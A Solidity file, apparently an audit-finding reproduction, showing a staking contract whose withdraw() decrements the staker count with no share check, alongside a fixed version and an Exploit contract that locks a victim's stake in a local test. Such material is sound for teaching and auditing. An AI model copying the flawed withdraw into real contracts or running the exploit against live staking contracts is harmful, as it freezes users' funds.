// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * AuditVault 57533 — Magic Yearn MyStaking.withdraw (Zokyo, 2022-08).
 * stake() increments stakerCount. withdraw() decrements it with no check
 * that the caller actually has a share. A non-staker can drive stakerCount
 * to zero so every real withdraw underflows and the stake stays locked.
 */

contract MiniToken {
    string public name = "Stake";
    string public symbol = "STK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract MyStaking {
    MiniToken public immutable token;
    uint256 public stakerCount;
    mapping(address => uint256) public shares;

    constructor(MiniToken _token) {
        token = _token;
    }

    function stake(uint256 amount) external {
        require(amount > 0, "amount");
        token.transferFrom(msg.sender, address(this), amount);
        if (shares[msg.sender] == 0) {
            stakerCount += 1;
        }
        shares[msg.sender] += amount;
    }

    function withdraw() external {
        uint256 share = shares[msg.sender];
        shares[msg.sender] = 0;
        // @> VULN: stakerCount decreases even when the caller has no share
        stakerCount -= 1;
        if (share > 0) token.transfer(msg.sender, share);
    }
}

contract MyStakingFixed {
    MiniToken public immutable token;
    uint256 public stakerCount;
    mapping(address => uint256) public shares;

    constructor(MiniToken _token) {
        token = _token;
    }

    function stake(uint256 amount) external {
        require(amount > 0, "amount");
        token.transferFrom(msg.sender, address(this), amount);
        if (shares[msg.sender] == 0) stakerCount += 1;
        shares[msg.sender] += amount;
    }

    function withdraw() external {
        uint256 share = shares[msg.sender];
        require(share > 0, "not staker");
        shares[msg.sender] = 0;
        stakerCount -= 1;
        token.transfer(msg.sender, share);
    }
}

contract VictimStaker {
    function approveAndStake(MiniToken token, MyStaking staking, uint256 amount) external {
        token.approve(address(staking), type(uint256).max);
        staking.stake(amount);
    }

    function tryWithdraw(MyStaking staking) external returns (bool ok) {
        (ok,) = address(staking).call(abi.encodeWithSignature("withdraw()"));
    }
}

contract Exploit {
    uint256 public constant LOCKED = 1000 ether;

    MiniToken public token;
    MyStaking public staking;
    VictimStaker public victim;
    uint256 public countAfterAttack;
    uint256 public stuck;
    bool public victimCouldWithdraw;

    constructor() {
        token = new MiniToken();
        staking = new MyStaking(token);
        victim = new VictimStaker();
    }

    function run() external {
        token.mint(address(victim), LOCKED);
        victim.approveAndStake(token, staking, LOCKED);
        uint256 countAfterStake = staking.stakerCount();
        uint256 attackerShare = staking.shares(address(this));
        staking.withdraw();
        countAfterAttack = staking.stakerCount();
        victimCouldWithdraw = victim.tryWithdraw(staking);
        stuck = token.balanceOf(address(staking));
        require(countAfterStake == 1, "one staker");
        require(attackerShare == 0, "attacker not staker");
        require(countAfterAttack == 0, "count zeroed");
        require(victimCouldWithdraw == false, "victim locked");
        require(stuck == LOCKED, "stuck");
        require(staking.shares(address(victim)) == LOCKED, "share remains");
    }
}
